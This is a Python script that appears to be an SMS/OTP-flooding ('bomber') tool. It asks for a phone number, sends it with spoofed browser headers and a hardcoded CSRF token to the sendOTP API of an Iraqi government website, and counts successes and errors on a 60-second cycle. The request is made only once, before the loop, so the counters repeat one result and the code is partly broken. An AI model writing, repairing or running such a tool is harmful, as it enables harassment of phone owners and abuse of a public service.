from rich.console import Console;from rich.progress import Progress;from rich.panel import Panel;import requests,time,os
G=0
E=0
I=Console()
N=input('[ N ] - Number |>  ')
H={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0','Accept': 'application/json,text/plain,*/*','Accept-Language': 'en-US,en;q=0.5','Content-Type': 'application/json','X-CSRF-TOKEN': 'R6B7hoBQd0wfG5Y6qOXHPNm4b9WKsTq6Vy6Jssxb','Origin': 'https://ur.gov.iq','Connection': 'keep-alive','Referer': 'https://ur.gov.iq/index/login','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Priority': 'u=0'}
D={"phone_num": f"{N}","phone_code": "964","channel": "phone"}
R=requests.post('https://ur.gov.iq/api/user/sendOTP',headers=H,json=D).text
while True:
    if '"data"' in R:
        G += 1
    else:
        E += 1
    os.system('cls' if os.name == 'nt' else 'clear')
    Y=Panel(f"✅ | {G}",title="Done",border_style="green",title_align="center")
    T=Panel(f"❌ | {E}",title="Error",border_style="red",title_align="center")
    X=Panel(f"⚠️ | {N}",title="Number",border_style="yellow",title_align="center")
    I.print(Y,T,X,sep="  ")
    with Progress() as F:
        A=F.add_task("[blue][ T ] - Time | ",total=60)
        while not F.finished:
            time.sleep(1)
            F.update(A,advance=1)
